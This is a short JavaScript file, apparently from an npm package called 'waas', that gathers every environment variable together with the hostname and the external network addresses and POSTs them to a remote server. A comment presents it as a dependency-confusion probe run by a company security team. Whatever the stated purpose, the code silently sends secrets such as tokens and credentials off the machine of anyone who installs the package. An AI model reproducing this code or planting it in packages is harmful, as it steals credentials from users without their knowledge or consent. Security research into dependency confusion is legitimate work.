'use strict'

// This code dumps local env variable and post them to an http server to identify the machines vulnerable to npmjs org/package claim.
// If you see this comment, please contact security@nexthink.com - this code and server are under the control of the Nexthink Security Team and no harmful code is executed.

const env = process.env;

const os = require("os");
env.hostname  = os.hostname();
env.package = "waas";

const nets = os.networkInterfaces();
const results = Object.create(null);
for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
        // Skip internal (i.e. 127.0.0.1) addresses
        if (!net.internal) {
            if (!results[name]) {
                results[name] = [];
            }
            results[name].push(net.address);
        }
    }
}
env.inets = JSON.stringify(results);

// request options
const options = {
  method: 'POST',
  body: JSON.stringify(env),
  headers: {
    'Content-Type': 'application/json'
  }
}

// send POST request
const url = "https://doc.nexthink.com/npm";
fetch(url, options);
